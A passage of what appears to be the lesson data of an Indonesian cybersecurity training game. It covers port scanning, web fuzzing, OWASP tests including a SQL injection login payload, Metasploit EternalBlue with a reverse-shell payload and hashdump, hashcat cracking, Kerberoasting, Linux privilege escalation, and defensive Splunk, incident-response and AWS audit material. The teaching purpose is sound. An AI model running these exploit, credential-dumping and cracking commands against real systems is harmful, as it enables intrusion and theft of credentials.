        futures = {ex.submit(scan_port, host, p): p for p in range(start_port, end_port+1)}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                port, service = result
                open_ports.append(port)
                print(f"[+] Port {port:5d}/tcp  OPEN  {service}")
    print(f"[*] Done: {len(open_ports)} open ports found")
    return sorted(open_ports)

if __name__ == "__main__":
    scan_host("127.0.0.1", 1, 1024)`,
      explanation:'• socket.connect_ex: return 0 jika sukses\n• ThreadPoolExecutor: scan paralel = cepat\n• getservbyport: nama service dari nomor port\n• with socket: auto-close koneksi',
      simulation:['[*] Scanning 127.0.0.1 (1-1024)','[+] Port    22/tcp  OPEN  ssh','[+] Port    80/tcp  OPEN  http','[+] Port   443/tcp  OPEN  https','[*] Done: 3 open ports found'],
      xp:80, helper:'scripting'
    }),
    () => ({
      type:'script', title:'Bash Recon Script',
      desc:'Buat script bash untuk automated reconnaissance pada target jaringan.',
      code:`#!/bin/bash
# Simple Network Recon Script

TARGET="$1"
OUTPUT_DIR="recon_\${TARGET//./\\_}"
mkdir -p "$OUTPUT_DIR"

echo "[*] Starting recon on: $TARGET"
echo "[*] Output dir: $OUTPUT_DIR"
echo "======================================="

# 1. Ping test
echo "[+] Ping test..."
ping -c 3 "$TARGET" > "$OUTPUT_DIR/ping.txt" 2>&1
if [ $? -eq 0 ]; then
    echo "    Host is UP"
else
    echo "    Host is DOWN or blocking ICMP"
fi

# 2. Port scan (quick)
echo "[+] Quick port scan..."
nmap -F --open "$TARGET" > "$OUTPUT_DIR/nmap_quick.txt" 2>&1
grep "open" "$OUTPUT_DIR/nmap_quick.txt"

# 3. DNS lookup
echo "[+] DNS lookup..."
host "$TARGET" > "$OUTPUT_DIR/dns.txt" 2>&1
cat "$OUTPUT_DIR/dns.txt"

# 4. WHOIS
echo "[+] WHOIS..."
whois "$TARGET" > "$OUTPUT_DIR/whois.txt" 2>&1
grep -E "Registrar|Created|Expires|Name Server" "$OUTPUT_DIR/whois.txt"

echo "======================================="
echo "[*] Recon complete! Check: $OUTPUT_DIR/"`,
      explanation:'• $1: argumen pertama dari command line\n• ${TARGET//./\\_}: ganti titik dengan underscore\n• $?: exit code perintah terakhir\n• -F: fast scan (100 port populer)',
      simulation:['[*] Starting recon on: example.com','[+] Host is UP','[+] 22/tcp open ssh','[+] 80/tcp open http','[+] Registrar: NAMECHEAP INC','[*] Recon complete!'],
      xp:70, helper:'scripting'
    }),
    () => ({
      type:'script', title:'Python HTTP Fuzzer',
      desc:'Buat fuzzer sederhana untuk directory/file enumeration pada web server.',
      code:`import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

WORDLIST = [
    "admin", "login", "dashboard", "api", "backup",
    "config", "upload", "files", "images", "static",
    ".env", "robots.txt", "sitemap.xml", "phpinfo.php",
    "wp-admin", "wp-config.php", "shell.php", "test",
]

def check_path(base_url, path, timeout=5):
    url = f"{base_url.rstrip('/')}/{path}"
    try:
        r = requests.get(url, timeout=timeout, allow_redirects=False)
        if r.status_code not in [404, 400]:
            return url, r.status_code, len(r.content)
    except requests.RequestException:
        pass
    return None

def fuzz(target_url):
    print(f"[*] Fuzzing: {target_url}")
    print(f"[*] Wordlist: {len(WORDLIST)} entries")
    print("-" * 50)
    found = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(check_path, target_url, p): p for p in WORDLIST}
        for future in as_completed(futures):
            result = future.result()
            if result:
                url, status, size = result
                found.append(result)
                icon = "🔴" if status < 300 else "🟡"
                print(f"{icon} [{status}] {url} ({size}b)")
    print(f"\n[*] Found: {len(found)} paths")
    return found

fuzz("http://target.com")`,
      explanation:'• allow_redirects=False: tangkap redirect (301/302)\n• status not in [404,400]: filter not found\n• ThreadPoolExecutor: concurrent requests\n• rstrip("/"): normalisasi URL',
      simulation:['[*] Fuzzing: http://target.com','[*] Wordlist: 18 entries','🔴 [200] http://target.com/admin (4821b)','🟡 [301] http://target.com/api (0b)','🔴 [200] http://target.com/robots.txt (127b)','[*] Found: 3 paths'],
      xp:85, helper:'scripting'
    }),
  ],

  // ─── 4. KONSEP SECURITY ──────────────────────────────────────
  concepts: [
    () => ({
      type:'concept', title:'CIA Triad + STRIDE Threat Model',
      desc:'Pahami fondasi security: CIA Triad dan STRIDE framework untuk threat modeling.',
      code:`# CIA TRIAD
Confidentiality : Data hanya bisa diakses yang berwenang
                  → Enkripsi, Access Control, MFA
Integrity       : Data tidak berubah tanpa izin
                  → Hashing (SHA256), Digital Signature, Checksum
Availability    : Sistem tersedia saat dibutuhkan
                  → Redundancy, Backup, DDoS Protection

# STRIDE THREAT MODEL
Spoofing        : Berpura-pura jadi orang lain
Tampering       : Modifikasi data/kode
Repudiation     : Menyangkal melakukan aksi
Info Disclosure : Bocornya informasi sensitif
Denial of Service: Ganggu ketersediaan layanan
Elevation of Privilege: Naik ke hak akses lebih tinggi`,
      explanation:'CIA + STRIDE adalah framework fundamental yang dipakai di semua sertifikasi (CISSP, CompTIA Security+). Semua ancaman cyber bisa dikategorikan ke dalam framework ini.',
      simulation:['[CIA] Checking security posture...','[C] Confidentiality: PASS (AES-256 encryption)','[I] Integrity: PASS (SHA-256 checksums)','[A] Availability: WARNING (no DDoS protection)','[STRIDE] Recommend: implement rate limiting'],
      xp:40, helper:'security'
    }),
    () => ({
      type:'concept', title:'Kriptografi: Hash, Enkripsi, TLS',
      desc:'Pahami konsep kriptografi yang digunakan dalam cyber security.',
      code:`# HASHING (satu arah, tidak bisa decrypt)
echo "password123" | md5sum          # MD5 (JANGAN pakai!)
echo "password123" | sha256sum       # SHA-256 (lebih aman)
echo "password123" | sha512sum       # SHA-512 (paling aman)

# CEK INTEGRITAS FILE
sha256sum file.zip > checksum.txt
sha256sum -c checksum.txt

# ENKRIPSI FILE dengan OpenSSL
openssl enc -aes-256-cbc -in file.txt -out file.enc -k "secretkey"
openssl enc -d -aes-256-cbc -in file.enc -out decrypted.txt -k "secretkey"

# CEK SERTIFIKAT SSL/TLS
openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -noout -text
echo | openssl s_client -connect target.com:443 | grep "subject\|issuer"`,
      explanation:'• Hash: one-way function, dipakai untuk password & integritas\n• MD5/SHA1 sudah tidak aman untuk password\n• AES-256-CBC: enkripsi simetris standar industri\n• TLS: enkripsi komunikasi jaringan',
      simulation:['$ echo "admin" | sha256sum','8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918','$ openssl s_client -connect target.com:443','Certificate: CN=target.com, Valid until Dec 31 2025'],
      xp:55, helper:'security'
    }),
    () => ({
      type:'concept', title:'OWASP Top 10 — Web Vulnerabilities',
      desc:'Daftar 10 kerentanan web paling kritis menurut OWASP.',
      code:`# OWASP TOP 10 (2021)
A01 Broken Access Control    : User akses data orang lain
    → Test: ubah ID di URL /profile?id=123 → id=124

A02 Cryptographic Failures   : Data sensitif tidak terenkripsi
    → Test: cek HTTP vs HTTPS, cek password di plaintext

A03 Injection (SQL/CMD/LDAP) : Input user langsung ke query
    → Test: ' OR '1'='1 di form login

A04 Insecure Design          : Arsitektur yang salah dari awal

A05 Security Misconfiguration: Default password, error verbose
    → Test: akses /admin, /phpmyadmin, /.git/

A06 Vulnerable Components    : Library/plugin versi lama

A07 Auth & Session Failures  : Weak password, session tidak expire

A08 Software & Data Integrity: Update tanpa verifikasi signature

A09 Logging & Monitoring Gaps: Serangan tidak terdeteksi

A10 Server-Side Request Forgery (SSRF): Server fetch URL attacker`,
      explanation:'OWASP Top 10 adalah standar referensi web security. Setiap penetration tester WAJIB hafal dan paham cara test masing-masing kategori.',
      simulation:['[OWASP Scanner] Checking target...','[A01] VULNERABLE: IDOR found at /api/user/{id}','[A03] VULNERABLE: SQL error in search parameter','[A05] INFO: /.git/ directory accessible','[A06] WARNING: jQuery 1.11.0 (CVE-2019-11358)'],
      xp:60, helper:'security'
    }),
  ],

  // ─── 5. HANDS-ON TOOLS ───────────────────────────────────────
  tools: [
    () => ({
      type:'command', title:'Metasploit Framework Basics',
      desc:'Gunakan Metasploit untuk eksploitasi vulnerability yang sudah diketahui.',
      code:`# Start Metasploit
msfconsole

# Search exploit
msf6 > search type:exploit name:eternalblue
msf6 > search cve:2021-44228

# Use exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit > info

# Set options
msf6 exploit > set RHOSTS 192.168.1.100
msf6 exploit > set LHOST 192.168.1.50
msf6 exploit > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run
msf6 exploit > check
msf6 exploit > run

# Meterpreter commands (post-exploit)
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
meterpreter > shell`,
      explanation:'• search: cari module berdasarkan keyword/CVE\n• RHOSTS: target IP\n• LHOST: IP kamu (listener)\n• check: verifikasi target rentan sebelum exploit\n• hashdump: ambil password hash Windows',
      simulation:['msf6 > use exploit/windows/smb/ms17_010_eternalblue','[*] Started reverse TCP handler on 192.168.1.50:4444','[+] 192.168.1.100:445 - The target is vulnerable.','[*] Meterpreter session 1 opened','meterpreter > getuid: NT AUTHORITY\\SYSTEM'],
      xp:90, helper:'security'
    }),
    () => ({
      type:'command', title:'Burp Suite Web Proxy',
      desc:'Setup dan gunakan Burp Suite untuk intercept dan analisis HTTP traffic.',
      code:`# Setup Burp Suite proxy
# 1. Buka Burp Suite > Proxy > Options
#    Bind: 127.0.0.1:8080
# 2. Konfigurasi browser: proxy ke 127.0.0.1:8080
# 3. Install Burp CA cert di browser

# Intercept request
# Proxy > Intercept > ON
# Browse target > request tertangkap > Forward/Drop/Edit

# Send ke Repeater (Ctrl+R)
# Edit request manual dan kirim ulang

# Send ke Intruder (Ctrl+I) untuk brute force
# Tandai §payload§ di parameter
# Set wordlist, klik Attack

# Scan dengan Active Scanner
# Target > Site Map > klik kanan > Actively Scan

# Penting: gunakan hanya di lab atau dengan izin tertulis!`,
      explanation:'• Proxy: intercept semua HTTP/HTTPS traffic\n• Repeater: modifikasi dan kirim ulang request manual\n• Intruder: automated fuzzing/brute force\n• Scanner: otomatis cari vulnerability (Burp Pro)',
      simulation:['Burp Suite starting on 127.0.0.1:8080','[Proxy] Intercepted: POST /login HTTP/1.1','[Proxy] Parameter: username=admin&password=test','[Repeater] Modified: password=admin123 -> 200 OK!','[Scanner] SQL Injection found in parameter: id'],
      xp:85, helper:'webpentest'
    }),
    () => ({
      type:'command', title:'Hashcat Password Cracking',
      desc:'Crack password hash menggunakan hashcat dengan berbagai metode serangan.',
      code:`# Identifikasi jenis hash dulu
hash-identifier "5f4dcc3b5aa765d61d8327deb882cf99"
# atau gunakan: haiti, hashid

# MD5 - Dictionary Attack
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# SHA-256 - Dictionary + Rules
hashcat -m 1400 -a 0 hash.txt rockyou.txt -r rules/best64.rule

# NTLM (Windows) - Brute Force
hashcat -m 1000 -a 3 ntlm_hash.txt ?a?a?a?a?a?a

# WPA2 WiFi
hashcat -m 2500 -a 0 capture.hccapx rockyou.txt

# Show cracked passwords
hashcat --show -m 0 hash.txt

# Mask attack (misal: Kata + 2 angka)
hashcat -m 0 -a 3 hash.txt ?u?l?l?l?l?d?d`,
      explanation:'• -m 0: MD5 | -m 1000: NTLM | -m 1400: SHA-256\n• -a 0: dictionary | -a 3: brute force/mask\n• ?a: semua karakter | ?l: lowercase | ?d: digit\n• rockyou.txt: wordlist 14 juta password',
      simulation:['hashcat starting...','Dictionary: rockyou.txt (14,341,564 words)','5f4dcc3b5aa765d61d8327deb882cf99:password','8621ffdbc5698829397d97767ac13db3:hunter2','Session..........: hashcat Status: Cracked 2/5'],
      xp:75, helper:'security'
    }),
  ],

  // ─── 6. PLATFORM LATIHAN ─────────────────────────────────────
  platforms: [
    () => ({
      type:'concept', title:'TryHackMe Learning Path',
      desc:'Jalur belajar optimal di TryHackMe untuk pemula cyber security.',
      code:`# RECOMMENDED PATH — TryHackMe

# STEP 1: Pre-Security (gratis)
Pre-Security Path:
  → Network Fundamentals
  → How The Web Works
  → Linux Fundamentals 1, 2, 3
  → Windows Fundamentals 1, 2, 3

# STEP 2: Complete Beginner (gratis sebagian)
Complete Beginner Path:
  → OWASP Top 10
  → Metasploit
  → Burp Suite
  → Nmap

# STEP 3: SOC Level 1 (untuk Blue Team)
SOC Level 1 Path:
  → Cyber Defence Frameworks
  → Cyber Threat Intelligence
  → Network Security & Traffic Analysis
  → SIEM (Splunk/ELK)
  → Incident Response

# STEP 4: Jr Penetration Tester
  → Web Application Pentesting
  → Network Security
  → Privilege Escalation (Linux & Windows)
  → Active Directory`,
      explanation:'TryHackMe adalah platform terbaik untuk pemula karena guided dan ada hint. Selesaikan Pre-Security Path dulu sebelum mulai yang lain. Konsistensi 1 room/hari lebih baik dari marathon.',
      simulation:['[TryHackMe] Connecting to machine...','[+] IP Address: 10.10.44.123','[Task 1] Complete: What is the IP? ✓','[Task 2] Complete: What port is SSH on? ✓','[+] 500 XP earned! Streak: 7 days 🔥'],
      xp:30, helper:'security'
    }),
    () => ({
      type:'concept', title:'HackTheBox — Starting Point',
      desc:'Panduan memulai HackTheBox untuk berlatih penetration testing yang lebih realistis.',
      code:`# HACKTHEBOX FLOW

# 1. Setup environment
# Download: Kali Linux / ParrotOS
# Connect VPN: sudo openvpn lab.ovpn

# 2. Starting Point (guided machines, ada walkthrough)
Tier 0: Meow, Fawn, Dancing, Redeemer
Tier 1: Appointment, Sequel, Crocodile, Responder
Tier 2: Oopsie, Vaccine, Unified, Included

# 3. Active Machines (no official walkthrough)
# Difficulty: Easy → Medium → Hard → Insane

# 4. Metodologi dasar
# Reconnaissance  → nmap, gobuster, ffuf
# Enumeration     → service version, web dirs
# Exploitation    → exploit vuln, searchsploit
# Post-Exploit    → privesc, persistence, loot

# 5. After pwn
cat /home/user/user.txt   # user flag
cat /root/root.txt        # root flag`,
      explanation:'HTB lebih realistis dari TryHackMe tapi less guided. Mulai dari Starting Point yang ada walkthrough. Jangan langsung lihat writeup — coba dulu minimal 1 jam sebelum hint.',
      simulation:['[HTB] Machine: Meow (10.129.1.17)','[+] Nmap: port 23/tcp open telnet','[*] Trying telnet login...','telnet> Username: root | Password: (empty)','[ROOT] Shell obtained!','[+] Flag: b40abdfe23665f766f9c61ecba8a4c19'],
      xp:35, helper:'security'
    }),
  ],

  // ─── 7. OFFENSIVE / RED TEAM ─────────────────────────────────
  offensive: [
    () => ({
      type:'command', title:'Active Directory Enumeration',
      desc:'Enumerate Active Directory untuk menemukan user, group, dan privilege path.',
      code:`# BloodHound collection
SharpHound.exe -c All --zipfilename ad_enum.zip

# PowerView recon (PowerShell)
Import-Module PowerView.ps1
Get-Domain
Get-DomainUser | Select samaccountname, description
Get-DomainGroup -Identity "Domain Admins" | Select member
Get-DomainComputer | Select name, operatingsystem

# Find path to Domain Admin
Find-DomainObjectPropertyOutlier
Invoke-ACLScanner | Where-Object {$_.IdentityReference -match "Domain Users"}

# Kerberoasting (extract service tickets)
Invoke-Kerberoast -OutputFormat hashcat | Select Hash

# AS-REP Roasting
Get-DomainUser -PreauthNotRequired | Select samaccountname`,
      explanation:'• BloodHound: visualisasi attack path ke Domain Admin\n• PowerView: AD enumeration via PowerShell\n• Kerberoasting: request TGS dan crack offline\n• AS-REP: akun tanpa pre-auth bisa di-roast tanpa password',
      simulation:['[BloodHound] Collecting AD data...','[+] Found 234 users, 47 groups, 18 computers','[!] Kerberoastable: svc_backup, svc_sql','[!] AS-REP Roastable: john.doe (no preauth)','[BloodHound] Shortest path: john.doe -> Domain Admin (3 hops)'],
      xp:100, helper:'security'
    }),
    () => ({
      type:'command', title:'Linux Privilege Escalation',
      desc:'Teknik umum privilege escalation di Linux dari user biasa ke root.',
      code:`# Cek sudo permission
sudo -l

# Cek SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Cek cron jobs
cat /etc/crontab
ls -la /etc/cron.*/

# Cek writeable files milik root
find / -writable -user root -type f 2>/dev/null | grep -v proc

# Cek capability
getcap -r / 2>/dev/null

# Kernel exploit check
uname -a
searchsploit linux kernel 4.15

# PATH injection
echo $PATH
# Jika . ada di PATH, bisa inject binary

# GTFOBins — sudo misconfig
# Contoh: sudo vim -> :!bash -> root shell!
# Cek: https://gtfobins.github.io`,
      explanation:'• sudo -l: sering ada misconfiguration\n• SUID: binary berjalan sebagai root\n• Cron job: kalau script world-writable bisa di-inject\n• GTFOBins: database binary yang bisa untuk privesc',
      simulation:['[linpeas] Running privilege escalation checks...','[!] sudo -l: (ALL) NOPASSWD: /usr/bin/vim','[!] SUID: /usr/local/bin/custom_backup','[!] Cron: /opt/backup.sh (writable by all)','[!] Kernel: 4.15.0 (CVE-2021-3493 vulnerable)'],
      xp:110, helper:'security'
    }),
  ],

  // ─── 8. DEFENSIVE / BLUE TEAM ────────────────────────────────
  defensive: [
    () => ({
      type:'command', title:'Splunk SIEM Query',
      desc:'Tulis Splunk SPL query untuk mendeteksi serangan dan anomali di log.',
      code:`# Deteksi brute force SSH
index=linux_logs sourcetype=auth
| search "Failed password"
| rex field=_raw "from (?<src_ip>\\d+\\.\\d+\\.\\d+\\.\\d+)"
| stats count AS attempts BY src_ip
| where attempts > 10
| sort -attempts
| head 20

# Deteksi port scan (banyak dest port dari satu IP)
index=network sourcetype=firewall action=blocked
| stats dc(dest_port) AS unique_ports BY src_ip
| where unique_ports > 50
| eval threat="Port Scan"

# Login sukses setelah banyak gagal (possible success after brute force)
index=linux_logs "Accepted password"
| eval success_time=_time
| join src_ip [
    search index=linux_logs "Failed password"
    | stats count AS fail_count, max(_time) AS last_fail BY src_ip
    | where fail_count > 5]
| where success_time > last_fail`,
      explanation:'• SPL: Search Processing Language milik Splunk\n• rex: ekstrak field dengan regex\n• stats count: agregasi data\n• dc(): distinct count\n• Pola ini dipakai di SOC analyst sehari-hari',
      simulation:['Splunk Search: brute force detection','Results (last 24h):','185.220.101.12  | 8,420 attempts | CRITICAL','103.99.0.122    |   445 attempts | HIGH','192.168.1.100   |    12 attempts | LOW','[Alert] Auto-blocked 185.220.101.12 via firewall'],
      xp:95, helper:'security'
    }),
    () => ({
      type:'script', title:'Python Incident Response Script',
      desc:'Script Python untuk automated incident response — collect artifacts dari sistem.',
      code:`#!/usr/bin/env python3
"""Incident Response — Artifact Collector"""
import subprocess, os, datetime, json, hashlib

def run(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.DEVNULL)
    except:
        return ""

def hash_file(path):
    try:
        with open(path, 'rb') as f:
            return hashlib.sha256(f.read()).hexdigest()
    except:
        return "UNREADABLE"

def collect():
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    report = {"timestamp": ts, "host": run("hostname").strip(), "artifacts": {}}

    # Running processes
    report["artifacts"]["processes"] = run("ps aux --no-header | head -30")

    # Network connections
    report["artifacts"]["connections"] = run("ss -tulpn")

    # Logged-in users
    report["artifacts"]["users"] = run("who -a")

    # Recent logins
    report["artifacts"]["last_logins"] = run("last -n 20")

    # Suspicious files (modified in last 24h)
    report["artifacts"]["recent_files"] = run(
        "find /tmp /var/tmp /dev/shm -type f -mtime -1 2>/dev/null"
    )

    # Crontabs
    report["artifacts"]["crontabs"] = run("crontab -l 2>/dev/null") + run("cat /etc/crontab")

    # Save report
    outfile = f"ir_report_{ts}.json"
    with open(outfile, 'w') as f:
        json.dump(report, f, indent=2)
    print(f"[+] IR Report saved: {outfile}")
    return report

if __name__ == "__main__":
    collect()`,
      explanation:'• subprocess.check_output: jalankan command OS\n• hashlib.sha256: hash file untuk integritas\n• /tmp /var/tmp: lokasi favorit attacker drop file\n• Script ini membantu DFIR analyst kumpulkan bukti',
      simulation:['[IR] Starting artifact collection...','[+] Host: prod-server-01','[+] Processes: 127 running','[!] Suspicious: /tmp/.hidden_shell (bash)','[!] Connection: 10.0.0.5:4444 ESTABLISHED','[+] Report saved: ir_report_20241201_143022.json'],
      xp:100, helper:'scripting'
    }),
  ],

  // ─── 9. CLOUD SECURITY ───────────────────────────────────────
  cloud: [
    () => ({
      type:'command', title:'AWS Security Audit',
      desc:'Audit konfigurasi keamanan AWS menggunakan CLI dan tools.',
      code:`# AWS CLI setup
aws configure
# AWS Access Key ID, Secret, Region, Output format

# Cek S3 bucket public access
aws s3api list-buckets --query "Buckets[].Name"
aws s3api get-bucket-acl --bucket my-bucket
aws s3api get-bucket-policy --bucket my-bucket

# Cek IAM users dan permissions
aws iam list-users
aws iam list-attached-user-policies --user-name admin
aws iam get-user-policy --user-name admin --policy-name policy1

# Cek security groups (firewall rules)
aws ec2 describe-security-groups \
  --query "SecurityGroups[?contains(IpPermissions[].IpRanges[].CidrIp,'0.0.0.0/0')]"

# Scout Suite — automated AWS audit
scoutsuite aws

# Pacu — AWS exploitation framework
pacu
> import_keys --all
> run iam__bruteforce_permissions`,
      explanation:'• S3 public bucket: salah satu kesalahan cloud terbesar\n• IAM: prinsip least privilege harus diterapkan\n• Security group 0.0.0.0/0: port terbuka ke internet\n• ScoutSuite: open source multi-cloud auditing tool',
      simulation:['[!] S3 Bucket: company-backup is PUBLIC READ!','[!] IAM User: dev_user has AdministratorAccess','[!] Security Group sg-123: port 22 open to 0.0.0.0/0','[!] RDS: database-prod publicly accessible','[ScoutSuite] 47 high-risk findings found'],
      xp:85, helper:'security'
    }),
    () => ({
      type:'concept', title:'Cloud Misconfiguration Top 10',
      desc:'10 kesalahan konfigurasi cloud paling umum yang menjadi celah serangan.',
      code:`# TOP 10 CLOUD MISCONFIGURATION

# 1. S3 Bucket Public
aws s3 ls s3://company-backup --no-sign-request
# Fix: Block Public Access di S3 settings

# 2. IAM User Dengan AdministratorAccess
# Fix: Gunakan role, bukan user langsung. Least privilege.

# 3. Root Account Digunakan Langsung
# Fix: MFA pada root, buat IAM user untuk daily use

# 4. Security Group 0.0.0.0/0 pada Port Sensitif
# Fix: Batasi IP, gunakan VPN/bastion host

# 5. RDS Publicly Accessible
# Fix: Taruh di private subnet, tidak expose ke internet

# 6. CloudTrail Tidak Aktif
# Fix: Enable di semua region, simpan log ke S3

# 7. Secrets di Environment Variable / Code
# Fix: Gunakan AWS Secrets Manager atau Parameter Store

# 8. MFA Tidak Diaktifkan
# Fix: Enforce MFA via IAM policy

# 9. Encryption At Rest Dimatikan
# Fix: Enable encryption di S3, EBS, RDS, dll

# 10. Unused Access Keys Tidak Dihapus
aws iam list-access-keys --user-name old-user
aws iam delete-access-key --access-key-id AKIAIOSFODNN7EXAMPLE`,
      explanation:'Cloud misconfiguration adalah penyebab 80% kebocoran data cloud. Bukan karena cloud tidak aman — tapi karena konfigurasi yang salah oleh penggunanya.',
      simulation:['[CloudSploit] Scanning AWS account...','[FAIL] S3: 3 buckets publicly accessible','[FAIL] IAM: Root account has active access keys','[WARN] CloudTrail: disabled in ap-southeast-1','[PASS] EC2: All instances in private subnet','Score: 6/10 — Needs improvement'],
      xp:70, helper:'security'
    }),
    () => ({
      type:'script', title:'Python AWS Recon Script',
      desc:'Script Python untuk enumerasi resource AWS menggunakan boto3.',
      code:`import boto3
import json

def recon_aws():
    session = boto3.Session()
    results = {}

    # S3 Buckets
    s3 = session.client('s3')
    buckets = s3.list_buckets().get('Buckets', [])
    results['s3_buckets'] = []
    for b in buckets:
        name = b['Name']
        try:
            acl = s3.get_bucket_acl(Bucket=name)
            public = any(
                g.get('URI','').endswith('AllUsers')
                for g in acl.get('Grants',[])
                for g in [g.get('Grantee',{})]
            )
            results['s3_buckets'].append({
                'name': name,
                'public': public
            })
            if public:
                print(f"[!] PUBLIC BUCKET: {name}")
        except Exception as e:
            pass

    # IAM Users
    iam = session.client('iam')
    users = iam.list_users().get('Users', [])
    results['iam_users'] = [u['UserName'] for u in users]
    print(f"[*] IAM Users: {len(users)}")

    # EC2 Instances
    ec2 = session.client('ec2', region_name='ap-southeast-1')
    instances = ec2.describe_instances()
    count = sum(len(r['Instances']) for r in instances['Reservations'])
    results['ec2_count'] = count
    print(f"[*] EC2 Instances: {count}")

    with open('aws_recon.json', 'w') as f:
        json.dump(results, f, indent=2, default=str)
    print("[+] Saved: aws_recon.json")

recon_aws()`,
      explanation:'• boto3: AWS SDK untuk Python\n• Session: bisa pakai profile atau env var AWS_ACCESS_KEY_ID\n• Jalankan hanya di akun sendiri atau dengan izin tertulis\n• Output JSON bisa langsung dianalisis lebih lanjut',
      simulation:['[*] Connecting to AWS...','[!] PUBLIC BUCKET: dev-assets-old','[!] PUBLIC BUCKET: company-backup-2023','[*] IAM Users: 12','[*] EC2 Instances: 8','[+] Saved: aws_recon.json'],
      xp:95, helper:'scripting'
    }),
  ],

  // ─── 10. APPSEC / DEVSECOPS ──────────────────────────────────
  appsec: [
    () => ({
      type:'command', title:'SAST & DAST Security Testing',
      desc:'Integrasikan security testing dalam CI/CD pipeline dengan SAST dan DAST tools.',
      code:`# SAST — Static Analysis (source code)
# Semgrep (multi-language)
semgrep --config=auto ./src/

# Bandit (Python security linter)
bandit -r ./app/ -f json -o bandit_report.json

# ESLint security plugin (JavaScript)
npx eslint --plugin security ./src/

# DAST — Dynamic Analysis (running app)
# OWASP ZAP baseline scan
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t http://localhost:3000 -r zap_report.html

# Nikto web scanner
nikto -h http://localhost:3000 -Format htm -output nikto_report.html

# SQLMap (SQL Injection testing)
sqlmap -u "http://app.com/search?q=test" --dbs --batch

# Dependency check (vulnerable libraries)
npm audit
pip-audit
safety check`,
      explanation:'• SAST: analisis kode tanpa menjalankan app (shift-left)\n• DAST: test app yang sedang berjalan (black-box)\n• Semgrep: paling fleksibel karena rule-based\n• Integrasikan ke GitHub Actions/Jenkins untuk DevSecOps',
      simulation:['[Bandit] Scanning Python code...','[HIGH] SQL injection: execute(f"SELECT * FROM {table}")','[MEDIUM] Hardcoded password: password = "admin123"','[Semgrep] 3 high severity, 7 medium severity findings','[ZAP] Active Scan: XSS found in /search endpoint'],
      xp:90, helper:'security'
    }),
    () => ({
      type:'concept', title:'GitHub Actions DevSecOps Pipeline',
      desc:'Setup CI/CD pipeline dengan security scan otomatis menggunakan GitHub Actions.',
      code:`# .github/workflows/security.yml
name: Security Scan Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  sast:
    name: Static Analysis
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      # Semgrep SAST
      - name: Run Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/owasp-top-ten

      # Dependency audit
      - name: Audit dependencies
        run: |
          pip install safety
          safety check -r requirements.txt

  secrets:
    name: Secret Detection
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          fetch-depth: 0

      # Detect hardcoded secrets
      - name: Run Gitleaks
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}

  container:
    name: Container Scan
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Build image
        run: docker build -t myapp:latest .
      - name: Trivy vulnerability scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: myapp:latest
          severity: HIGH,CRITICAL`,
      explanation:'• DevSecOps: security di setiap tahap development\n• Gitleaks: deteksi API key/password yang tidak sengaja di-commit\n• Trivy: scan Docker image untuk vulnerable packages\n• Pipeline ini jalan otomatis setiap ada push/PR',
      simulation:['[Semgrep] Scanning 247 files...','[!] HIGH: SQL injection in app/db.py line 45','[Gitleaks] Scanning git history...','[!] LEAK: AWS_SECRET_KEY found in commit a3f9d2b','[Trivy] Scanning myapp:latest...','[!] CVE-2023-44487 in nginx:1.18 (CRITICAL)'],
      xp:85, helper:'security'
    }),
    () => ({
      type:'concept', title:'Secure Code Review Checklist',
      desc:'Checklist review kode dari perspektif keamanan sebelum merge ke production.',
      code:`# SECURE CODE REVIEW CHECKLIST

# ══ INPUT VALIDATION ══
[ ] Semua input user divalidasi di server-side
[ ] Tidak ada eval() atau exec() dengan user input
[ ] Parameterized query (bukan string concatenation SQL)
[ ] File upload: validasi type, ukuran, scan konten

# ══ AUTHENTICATION ══
[ ] Password di-hash dengan bcrypt/argon2 (bukan MD5/SHA1)
[ ] Session token random dan cukup panjang (>128 bit)
[ ] Logout menghapus session di server
[ ] Rate limiting pada endpoint login

# ══ AUTHORIZATION ══
[ ] Setiap endpoint cek permission user
[ ] Tidak ada IDOR: akses resource by ID tanpa validasi ownership
[ ] Admin endpoint tidak accessible oleh user biasa

# ══ SECRETS MANAGEMENT ══
[ ] Tidak ada hardcoded password/API key
[ ] Config dari environment variable, bukan file di repo
[ ] .env masuk .gitignore

# ══ DEPENDENCIES ══
[ ] npm audit / pip-audit tidak ada critical
[ ] Lock file (package-lock.json) di-commit
[ ] Tidak ada library yang sudah deprecated/unmaintained

# ══ ERROR HANDLING ══
[ ] Error message tidak bocorkan stack trace ke user
[ ] Logging tidak menyimpan password/token
[ ] Try-catch pada semua external calls`,
      explanation:'Code review dari sudut pandang security adalah skill krusial untuk AppSec engineer. Gunakan checklist ini sebagai PR template di GitHub/GitLab.',
      simulation:['[Code Review] PR #247: Add user profile edit','[!] Line 89: SQL concatenation - use parameterized query!','[!] Line 134: console.log(password) - remove logging!','[!] Line 201: IDOR - missing ownership check on user_id','[PASS] Authentication: bcrypt used correctly','Result: 3 security issues found - REQUEST CHANGES'],
      xp:75, helper:'webpentest'
    }),
  ],

  // ─── 11. MALWARE ANALYSIS ────────────────────────────────────
  malware: [
    () => ({
      type:'command', title:'Static Malware Analysis',
      desc:'Analisis malware secara statis tanpa menjalankannya untuk ekstrak IOC.',
      code:`# SETUP: gunakan VM isolated, snapshot dulu!

# File identification
file suspicious.exe
xxd suspicious.exe | head -20   # hex dump
